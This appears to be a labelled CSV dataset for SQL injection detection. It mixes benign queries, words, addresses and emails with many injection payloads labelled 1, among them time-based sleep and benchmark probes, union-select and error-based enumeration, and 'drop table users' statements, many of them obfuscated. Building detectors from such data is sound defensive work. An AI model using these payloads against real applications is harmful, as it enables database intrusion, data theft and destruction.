Query,Label,cluster,stratify_col
1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,1,4,1_4
"6'\and/0x954  .like   benchmark (  0b80011000100101100000000,md5  (  0x0b110d0b0o0b0b1011111011010001110100000010011010010000010100101100001100111101101<
 )    ) /**/Ã¢Â /*	/t5x*/or/**/'z'='zz'#[i",1,9,1_9
"select&count <(
)*	&)+)	from?sysibm.systables(as^t0b0b0x5x9o4x5x3x0x8x6x0b1b0,sysibm.systablesÃ¢Â as@t0o12o9,sysibm.systables!as{t0o2x7b3x0b6o1b0x8x4x0x6x0o6o0b110xcca	+and`)])([`.<(~+\""%""Ã¢Â like:""",1,2,1_2
"1"" where 4445  =  4445 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",1,4,1_4
select * from himself where dried between '1996-07-01' and '1996-07-31',0,5,0_5
"1) union select 1,database(),3--#a3a7p",1,4,1_4
sobrecogimiento,0,8,0_8
select * from large 3 select * from stone,0,5,0_5
select count ( took ) from sitting,0,1,0_1
from  ( select distinct wealth from black ) ,0,7,0_7
"-1558 or elt  (  3306  =  2272,2272  )  -- ioxt",1,6,1_6
"select-count^
(`[*')
-<from~domain.domains*as`t4b101,domain.columns!as$t0b0x0o0b0o5,domain.tables/**/as@t3<and)?:(|'fnon'.like:'fnon",1,2,1_2
"   select employees.affect, count ( orders.coldid )  as jarfrom    ( ordersinner join amount on orders.symbolid  =  employees.silkid ) ",0,1,0_1
 update duty set pocket = 'closely'where product = 'press',0,5,0_5
d2sa2uer5o,0,8,0_8
select * from frozen where fog = 'raw'  and city = 'soap',0,5,0_5
"-1859' union all select 1781,1781,1781,1781#",1,4,1_4
"1)
='s'--",1,0,1_0
select * from farther where that = 'gradually' limit 3,0,5,0_5
"1'  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  ",1,4,1_4
1  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ,1,4,1_4
select * from garden,0,5,0_5
diafragmar,0,8,0_8
1'   )    )    as njop where 7001  =  7001,1,6,1_6
select count ( youth )  from hide,0,1,0_1
"|select * from\users@whereÃ¢Â id}<=/ 0x0x6  or   (select (select 1))<@!:=  0x0b5\union:select (select
(select 1)),version  (    ).( and 1 --1x",1,2,1_2
"-6478""   )    )    union all select 7087,7087,7087,7087,7087,7087,7087,7087--",1,4,1_4
"  select general,ourselves,farther from vowel left join orders on lift.continuedid =  cattle.trip order by bent.respect",0,1,0_1
"1' in boolean mode  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  #",1,1,1_1
"select sleep /*omhx!qm*/(?Ã¢Â (select 0x5)Ã¢Â ))$ and|	 (
;0o2x0b0b1010010110001101010010010111101110 ^=  1435",1,2,1_2
"1   )    )    as ambt where 5198  =  5198 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --",1,4,1_4
select   (  case when   (  3344  =  8103  )   then 3344 else 1/  (  select 0  )   end  )  --,1,4,1_4
select chest ( s )  from line union,0,1,0_1
select count ( distinct program )  from reason,0,1,0_1
select avg ( price ) from friend,0,1,0_1
1'  )   where 2808  =  2808,1,6,1_6
"1' union select table_name, null, null from information_schema.tables /**//*!*/and/**/1=1--",1,0,1_0
clay@parcalia.ml,0,0,0_0
"-9558""   )    )     )   union all select 2935,2935,2935,2935,2935--",1,4,1_4
"admin';or
'0o0o0o6'
=;'6",1,9,1_9
select * from dinner where layers = 'ranch'  and  ( stage = 'suit' or useful = 'heart' ) ,0,5,0_5
select avg ( lips ) from simply,0,1,0_1
"1  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  ",1,4,1_4
"  select difficultyid as id, save as even from highest",0,7,0_7
"9""[)/*jp*/*]as`wsyv where0x1fce( like! 1x0o1fce rlike sleep ^( &0b0xab ;)   andtrue  or  false && true and (select (select 1))#z~ne",1,2,1_2
select business from word union all select desk from exactly order by fear,0,7,0_7
"-8410"" or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""xhzr""  =  ""xhzr",1,4,1_4
aloguer,0,8,0_8
1'  )   and 3560  =  5467--,1,6,1_6
" or=?'something'/*clg?\e)
r*/ Ã¢Â /*p^(select;0b0b1070b3x7)*/like	?\'some'+'thing'",1,2,1_2
select * from essential fetch first 50 percent rows onlyselect top 3 * from horse,0,0,0_0
"1   )    )    union all select null,null--",1,4,1_4
select * from final fetch first 3 rows only select top 50 percent * from some,0,5,0_5
"'or
1=1",1,6,1_6
"1' or   (  select 'votg' where 2x0b1108f6  like  (select 0x13f0o0o0b1) or (select 8156)  =    (  select*count  (  *  )   from generate_series  (  0x1,(select 0x4c4b40)   )    ),  or/(select (select (select (select 0x8)))) or '%' not like '%' or false or false or 6   &&  """"p""`not like ""pb""	or 0x9e4 like (select (select!2733)) and true or 2289!=(select 2289) --",1,2,1_2
"1%""   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  ""%""  =  """,1,4,1_4
'/**/and/**/1=1/**/ or 'b'='b'--/**/,1,9,1_9
"8' or  (
 select 'sbip' from dual where 0x1ccc like 	0x5c0b0b0b0b1010110110101010010000111010010010010101011110001001101111011100110 and   (  select * from   (/**/ select  (  sleep  (  (select (select 0x5))   ) ~  )  ;  )/*w-q*/ fzno   )    ) ~/*	a*/ or '",1,9,1_9
select * from  ( select worth from foreign ) ,0,7,0_7
"1""])   or/*b;*/6b0x20ea: |like   benchmark  ( 
(select (select;0x4c6599)),md0b0o0o5  (  0x0b0o1634a2745.`Ã¢Â )[ )       and    or  false|and (select (select (select 0x1))) and true  and; true or (select?(select 0x0)) or false and true or false#(  (  ""qkds"" like ""qkds*a>z",1,2,1_2
select count ( * )  as mine,0,1,0_1
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (     (  'pfle' like 'pfle,1,4,1_4
1937550000000000,0,3,0_3
"1'  )   where 3579  =  3579   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --",1,4,1_4
select * from under fetch first 3 rows only,0,0,0_0
;/*!12345*/drop/**/table/**/users;/**/--,1,0,1_0
" (  select chr& (  (select 0o0b10100021) %)  ||chr  ( ?(select 0xad)? )  ||chr} (  0x89  ) ^ or chr _(  (select 306) ~)
 ||chr  (  (select 0x71)  )  or  (
 select   (/*y(de*tryf*/ case%when < (  (select (select 0x1f4c)).~like  0x1e84 ~)   then (select (select 7o0b1)) else 0o0x0Ã¢Â end  )   from dual  )&?||chr  (  (select/0b0x71) ~)   or chr  ( ]0x7a  )     or   chr ~(  (select~(select 198)) *)  =or chr  (  (selectÃ¢Â (select (select 122)))  )   or{chr  (  (select (select (select (select (select 188)))))  )   from dual  ) ",1,4,1_4
"0x0o8%'r=   (?>select}""
(	&case[when{	&(@&8b0x0o1e6b100/*pg2&<zgwp-z;tpuldb<*/ like  (select 0o9x0x0b106bb8b1)?)  	then@(select]9x1)~else^0o0o4o0b0x98 end}  ); ?+):	  and '%', like//'",1,9,1_9
85510378n,0,3,0_3
"  select needed as duck, fire as [automobile]  from throughout",0,7,0_7
"0o0x0b1o0x0x0o2%' ])/*!/n	(select
0b110)4g)|1;*/  union)all select!null,null,null,null,null and/*g not like )\s+.gfo!w*/true_ && !(select{(select=(select]0x4eca)))like'(select 1x0b0o1a92)>and ""sk""=""sk""   or ; 0x23de=(select (select 9283))	 +?or..  (select.(select 0x1143))=(select 0b0x1145)&&true or ""k""[like ""ko"" and true#io0o4ga&'fr?cp9q{s;a",1,2,1_2
select * from party where    not factory = 'torn',0,5,0_5
"'or
'1' = '1
and'a' = 'a'/*
*/",1,9,1_9
"'/**/and/**/1 =  convert(int,@@version)--",1,0,1_0
"1'/*y'zw{ff\b{*/in-boolean mode ])   and (select 8o0xdb3) ?`=;   Ã¢Â ( select count  (
 *  ) /**/ from
domain.domains as t2,domain.columns/*j""oftnvt<*/asÃ¢Â t2,domain.tables)as t3  )    and[ (select 0b101x5o0b101o0b101101011100010) like 0o0o0b101110010101010!<and  true`and true and=3o1    &&    true or\false or false and true#$;0b11e
m8:?$/",1,2,1_2
731467000000000,0,3,0_3
1/**/and/**/1in/*!12345*/(1)1 and 'a'='a',1,0,1_0
"8'+!~( [select]gthp(where (select 0o61x9ca3)  =  (select 2x0o0b1c5x8f)/*ebq=n<q4tvr2t*/	or  sleep  (+ 4x1} ) $ and ""m"" like:""m""   &&  _""%,f"" not  like  ""%,fj"" or('l' not like 'l'  or   (select 0x8b7) or falseand 0x1 and (select (select (select (select (select (select 0x1)))))) or false{or='dw' not = 'dw'?  &&?  true or 'ow_u' like 'ow_u-' and true or false and 1 or false or (select (select 0))#akekl3rc+{0",1,9,1_9
"1' || ascii(substring(database(), 1, 1)) > 100 ----euxes8w5r72ey",1,0,1_0
select * from inch,0,5,0_5
select count ( joined ) from won,0,1,0_1
kaneko,0,8,0_8
select * from practical  where every not like '[calm]%',0,7,0_7
"-3960""   )    )    union all select 7813,7813,7813,7813,7813,7813--",1,4,1_4
"0b7o0o4b977b2b17xa|&)-/*\mf./`b]*j.}bdx!h0x0b0x5x3{ezpvgo3>*/{union
all
select_null,null--",1,2,1_2
tosigoso,0,8,0_8
oseja,0,8,0_8
general castaos 180 9-e,0,0,0_0
"  select explainid as id, beautiful as eager from with",0,7,0_7
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 4286 )  order by meta_id asc",0,7,0_7
"  select tableid as id, upper as yesterday from future",0,7,0_7
soldani-godet@informex.ru,0,0,0_0
saprtich@seramitex.sv,0,0,0_0
"1"" where 1982  =  1982",1,6,1_6
"1%u0027%u0020a/*!*/nd%u0020substring(database(),%u00201,%u00201)%u0020=%u0020%u0027s%u0027%u0020--",1,2,1_2
"  select primitive,term from government where making = 'except' union select such, roof from consonant",0,7,0_7
"1'/**/and/**/substring(database(),/**/1,/**/1)/**/=/**/'s'/**//**/--/**/random_noise----h1xx50",1,9,1_9
1064,0,3,0_3
select rising ( s )  from condition select development ( s ) ,0,1,0_1
18179,0,3,0_3
' || 1=1 -- --5pk0wgma5toz,1,2,1_2
"1%'   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  '%'  =  '",1,9,1_9
"1))/*!12345*/unionselect/*
*/1,database(),3/*!*/and1=1--",1,0,1_0
select * from hurry where proper = 'below' fetch first 3 rows only,0,5,0_5
select avg ( price ) from movie,0,1,0_1
; drop table users;  or 'b'='b'--#i957g44l,1,0,1_0
select * from rich where seven not like 'theory%',0,7,0_7
"select count  (/*Ã¢Â .)   from[domain.domains as t0b8,domain.columns:as_t6x0b0o7b13,domain.tables=as
t3'and/*;r*/   (\*``(`'~
(` ""mkal""`=<""mkal",1,2,1_2
select   (  case when   (  4111  =  1992  )   then 4111 else 1/  (  select 0  )   end  )  --,1,4,1_4
"1  )   as zhvx where 3171  =  3171 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",1,4,1_4
admin'/**/or '1'like'1,1,9,1_9
"1'   ) 	  )   ]?)   or   (  select (select (select 0x23a3)) from  (  select count  (  *  )  ,concat [(  0b0x7191906a71,  (  select   (  elt  ( (select (select 0x23d5))   like   (select (select (select 0x23d0b101))),0o0b0o23420   )    )   + ) [,0x0x0b1011201101a0b1011111111a72,floor (  rand  (  (select (select (select (select (select (select 0))))))  )& *0o2_  )    )   x from information_schema.character_sets group by x  )  a_=)   and   \(    (     () 'zeum' like 'zeum",1,9,1_9
"   select age, greatest, drawfrom seldom where full  is not null",0,1,0_1
"1'				a/*!12345*/nd				substring(database(),				1,				1)					=					's'				--#6fa18s3fryckd",1,9,1_9
obolensky@etnics.hr,0,0,0_0
select * from action where catch = 'public',0,5,0_5
"1%'   )    )     )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (     (  '%'  =  '",1,9,1_9
"0b0b0o1'>*or  
 ( }select 'xtcb'
where,(select
(select_5180))[like}3o82740",1,4,1_4
"+select-* from users where id 
=  (select 2) or ""? (  ""	or 0x0x0x0o1    like    (select (select (select (select (select 5))))) or false  and  true -- 6x1hdr0x7",1,4,1_4
"4'<or<0x0o0o5c4b0o0 or false}and true ' or:  5xd10 )=` 0b116107010111	 and  0x9 	or  false or false or false  and  true or false or false or "";fl|4""  like  "";fl|46""#like ;like} (  'abcdefg',upper -(  hex""?(+ randomblob  ( :(select (select 0o0x242aafb2))/(select (select 0b1x0o2o6b4b0x8f3))   )=]  ){+ 	<)! '\)*  [&\	f\wv",1,2,1_2
"0o0x6o1'  )   ;)   /**/ or  char  (< (select 0x17)  )  or char ( }(select (select 0xa0)) [)    or  char  (,@(select 0x5d)  )  or char  (  0x0x0o7f  )    like  regexp_substring  (  repeat  (  right/ ("" char/*smi*/ (  6x4a3  )     or     '""6'='""0b1010n' or'false and ""s""=""s"" and)true and ""tp"" not like ""tpj"" or false and ""cl""=""cl"" or "":"" not like "":"" or false and true or false and (select 0x1ab5)<>0x1ab6 or false or ""__rip"" not like ""__rip"" and true|or false or ""_tyx"" not like%""_tyx"" or (select (select (select (select (select (select (select 0))))))))or;false or (select (select 0)) or false and=true or	false# ,0b0x0x0x0x0  )  ,(select[4x18a0x0b8xee2b10a) "")] ,null, ) or ""+	p-i"" like ""+ p-ix"":or ""!""  like  ""!u"" or 0x6o0 or (select""(select 0o1x2xa1d))\= 0o2b3xa0o0o1e --)(lj~)aoyye~<",1,2,1_2
"exists(select1from
users)--
#r1la1bow6gf876",1,0,1_0
"1'   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  'kgdt' like 'kgdt",1,9,1_9
calle de joan miro s/n,0,0,0_0
1'  )   as lewd where 3118  =  3118 order by 1--,1,6,1_6
"1'   )>   ) 
 	as popm where (select (select.(select 0x199a)))   like  ]0o0x19c8\union)all select null,null  or/**//*!5wutc)n)b*/0b0o0  or  0x8ac@not like
(select (select 0x8ac)) && (select (select 3))#]$0b0x0b111
phou",1,4,1_4
select * from bottom where fully between '1996-07-01' and '1996-07-31',0,5,0_5
test'/*!12345*/or '1'='1' /*,1,9,1_9
" select * from users where id  =  '1' or \<   =  1 union select 1,@@version -- 1'",1,5,1_5
select avg ( mental ) from thick,0,1,0_1
1' where 8469  =  8469,1,6,1_6
"1'orif(substring(database(),1,1)in (1)'a',sleep(5),/*
*/0)----dirjve941ok5dm",1,0,1_0
"1'||  (  select 'skds' from dual where 8594  =  8594 and make_set  (  6779  =  2027,2027   )    )   ||'",1,9,1_9
"select wp_posts.id from wp_posts where 1 = 1 and wp_posts.post_type  =  'acf-field' and   (  (  wp_posts.post_status  =  'publish'  )  )   and wp_posts.post_name  =  'field_5f6c97aab4686' order by wp_posts.menu_order asc, wp_posts.post_title asc limit 0, 1",0,1,0_1
"1'   )    )     )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,1,1_1
1  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1,4,1_4
"1"" where 8635  =  8635 and 4595  =  4595#",1,6,1_6
isidro,0,8,0_8
"admin"", )++=or+""2b7b0""=""2x0b0b1x3b0x0""/*",1,2,1_2
sant aniol de finestres,0,0,0_0
"-8309'||  (  select 'qecl' where 8449  =  8449 union all select 8449,8449,8449,8449,8449,8449,8449--",1,4,1_4
rist,0,8,0_8
"c/ venus 91, 1e",0,0,0_0
"call regexp_substring  (  repeat {(./left  (  crypt_key  (} char; (  (select (select (select~0x0x29))) &), * or  char  (  8x0b101601 })   or char  (  6b0b11110110600101011011  )  ,null ) (,0x0 })  ,0o0x0o25f682bc  )  ,null  )  ;&&{ ; (  /*gpp;;*/ (   'tpih' like  'tpih",1,4,1_4
' and 1=1  /*!*/and 1=1-- --cn0b9wm,1,6,1_6
"1'>or  <(% select 'bpml' where (select (select 7380))   =   0x4cc0 or extractvalue  (  (select (select 0x511)),concat  (  0x0o0x5c,0o0x0x6d6e7aa71,  (_select   ( :elt!;(  (select (select 1277))  like  (select 0x511),(select/(select (select (select 0x5)))) /**/ ) 	))    ))  ,0x807a867a71  )    )   @ )   or '",1,9,1_9
"1"" and elt  (  4249  =  4249,7259  )   and ""kgtz"" like ""kgtz",1,4,1_4
waitfo/*!*/r delay '0:0:5'--,1,0,1_0
"c/ gustavo adolfo becquer 91,",0,0,0_0
"1%' and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1,4,1_4
1'+  (  select 'jtvq' where 8288  =  8288 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1,4,1_4
select min ( wooden )  as sight from valuable,0,1,0_1
"0o0b0o1'_or ((/*)y8*/;select
'qgnz'
where-0o0b1100100011010*=/**/ 0x0x0b1110011e",1,0,1_0
"-7544""   )    )    union all select 3808,3808,3808,3808--",1,4,1_4
"select pg_sleep  (  5  )   and ""%""  =  """,1,2,1_2
-8057'   )    )    as gpue where 4205  =  4205 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1,4,1_4
select count ( several ) from stems,0,1,0_1
;/*!*/select pg_sleep(5);  /*!*/and 1=1--,1,0,1_0
"1' or if(substring(database(), 1, 1)='a', sleep(5), 0) --",1,9,1_9
-4208%'   )    )     )   or 1133  =  9010--,1,6,1_6
"0b1'+	<( $select[wgmn where 8x0x1110;;like ,(select[0x1110) and	~(select(select{0o11x1eb3))(= 0x18d2>-)/*	g*(select 0x151)*/ +'",1,9,1_9
"1"" where 6785  =  6785 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,1,1_1
sabionda,0,8,0_8
"calle tampa 108, 7-g",0,0,0_0
brewton,0,8,0_8
"0x9x1/**/)Ã¢Â /*rn;*/: or$ (select?0x0)
and}0x1108<>0x1109@or false#as(nsdyÃ¢Â where 0o0o0x9d0o0x0b51b like }(select (select (select 4x0b1110111c6))),xm",1,2,1_2
select nearby ( s )  from hay,0,1,0_1
yevtushenko-pegna@corjet.al,0,0,0_0
select * from moving order by finger desc,0,7,0_7
"if  ( ]0b0b1011101001000100001100101000110111111     like   	(select (select (select 8160)))  )   select 4135""else drop function>otyy--",1,4,1_4
"1   )    )    union all select null,null,null,null,null,null,null,null,null#",1,4,1_4
select * from congress fetch first 50 percent rows only,0,0,0_0
select * from settlers where cloud between '1996-07-01' and '1996-07-31',0,5,0_5
 update practical set hang = 'fellow'where carried = 'mark',0,5,0_5
select * from family where national = 'finish'  and  ( thousand = 'how' or shout = 'pan' ) ,0,5,0_5
65651817l,0,3,0_3
1   )    )    as cwyb where 3633  =  3633,1,6,1_6
l1am217r5,0,8,0_8
-8513' union all select 7414--,1,6,1_6
"1"" and sleep  (  5  )  #",1,4,1_4
test'/*!12345*/or/**/'1'='1'/**/--/**/,1,9,1_9
"-8490   )    )    union all select 6910,6910,6910,6910,6910,6910#",1,4,1_4
50344,0,3,0_3
"1	or/*;w|=*/(select 0x1333)   like  <  ( select count+ (  *  )]  fromdomain.domains as t6,domain.columns/*p)g*/as t2,domain.tables as t7] ) <||/**/(select (select 4885))!=(select (select (select}0o0o0x4b2b)))> or  (select (select 0x2b8))=(select (select 0x25f))  or  false or "";""="";~"" --",1,4,1_4
